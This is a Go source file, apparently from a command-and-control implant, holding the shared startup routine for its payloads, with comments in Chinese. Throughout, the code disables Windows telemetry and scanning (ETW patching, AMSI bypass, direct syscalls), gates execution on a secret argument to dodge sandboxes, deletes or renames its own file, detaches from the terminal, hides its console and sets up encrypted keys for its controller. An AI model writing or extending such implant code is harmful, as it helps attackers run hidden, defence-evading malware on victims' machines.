package app

import (
	"implant/core/config"
	"implant/core/debuglog"
	"implant/core/evasion"
	"implant/core/disguise"
	"implant/core/encrypt"
	"implant/core/services"
	"implant/core/utils"
	"os"
)

// Init 执行各 adapter 共享的启动初始化序列：
// ExecuteKey 校验、客户端密钥管理器初始化、国际化伪装、隐藏控制台、DPI 感知。
// 返回 (clientID, ok)。ok=false 表示应直接退出（ExecuteKey 校验未通过）。
func Init(listenerType string) (clientID string, ok bool) {
	return initInternal(listenerType, false)
}

// InitDLL DLL 载荷初始化变体：跳过 ExecuteKey 的 os.Args 校验
// （rundll32/regsvr32 宿主场景没有可用的命令行参数）。
func InitDLL(listenerType string) (clientID string, ok bool) {
	return initInternal(listenerType, true)
}

func initInternal(listenerType string, dllMode bool) (clientID string, ok bool) {
	// OPSEC 配置占位符残留检测（fail-closed）：模板未 patch 时直接拒绝启动。
	// 必须在静默模式重定向 stdout 之前执行（错误可见）。
	config.VerifyNoPlaceholderResidue()

	// 静默模式（编译期配置）：重定向 stdout/stderr 丢弃，目标机无调试输出特征。
	// 注意：不能丢弃 stderr 之外的重要错误——fail-closed 检测已在上方完成。
	if config.QuietMode() {
		devnull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
		if err == nil {
			os.Stdout = devnull
			os.Stderr = devnull
		}
	}

	// 主机层对抗（编译期配置，Windows 生效）：
	// ETW Patch / AMSI Bypass / direct-indirect syscall trampoline——
	// 在一切网络行为前执行，遥测与扫描入口在最早时机被静默禁用。
	if err := evasion.Init(config.ETWPatchEnabled(), config.AmsiBypassEnabled(), config.SyscallMode()); err != nil {
		debuglog.Printf("⚠️ [EVASION] 对抗初始化失败（继续运行）: %v\n", err)
	} else {
		debuglog.Printf("🧬 [EVASION] 对抗初始化完成: ETW=%v AMSI=%v syscall=%s\n",
			config.ETWPatchEnabled(), config.AmsiBypassEnabled(), config.SyscallMode())
	}

	// ExecuteKey 反沙箱校验（DLL 模式跳过：无命令行参数）
	if !dllMode && config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return "", false
		}
		if os.Args[1] != config.ExecuteKey {
			return "", false
		}
	}

	// 前台自动守护化（Linux）：TTY 下运行自动脱离终端释放 shell，可继续输入命令。
	// 重新 exec 自身后父进程退出；子进程带标记跳过本步骤并继续完整初始化。
	daemonizeIfTTY()

	// 释放部署文件占用：原地重命名/删除自身（Windows 重命名解锁、Linux unlink），
	// 不复制到 temp、不重启——上线后部署的客户端文件可直接删除。
	if !dllMode {
		ReleaseFileLock()
	}

	// 初始化客户端密钥管理器（使用与服务端一致的 ClientID）
	cid, err := utils.GetMetaInfoClientID()
	if err != nil {
		debuglog.Printf("⚠️ [CLIENT-INIT] 获取ClientID失败: %v\n", err)
		return "", false
	}
	encrypt.InitClientKeyManager(cid)
	debuglog.Printf("🔑 [CLIENT-INIT] 客户端密钥管理器初始化成功: ClientID=%s\n", cid)

	// 注入监听器主密钥（MetaInfo 传输的 AES-GCM 加密用；须在 MetaInfo 生成前）
	_, masterKey := GetListenerKeyConfig(listenerType)
	encrypt.SetMasterKey(masterKey)

	// 国际化伪装
	if err := disguise.InitUniversalDisguise(); err != nil {
		debuglog.Printf("⚠️ [%s伪装] 国际化伪装初始化失败: %v\n", listenerType, err)
	} else {
		debuglog.Printf("🌍 [%s伪装] 国际化伪装初始化成功\n", listenerType)
	}

	// 隐藏控制台 + DPI 感知（Windows）——ConPTY 问题已修复，恢复正常生产行为
	if errConsole := services.HideConsole(); errConsole != nil && errConsole.Error() != "" {
		debuglog.Println(errConsole)
	}
	if errDPI := services.ProcessDPIAware(); errDPI != nil && errDPI.Error() != "" {
		debuglog.Println(errDPI)
	}

	return cid, true
}
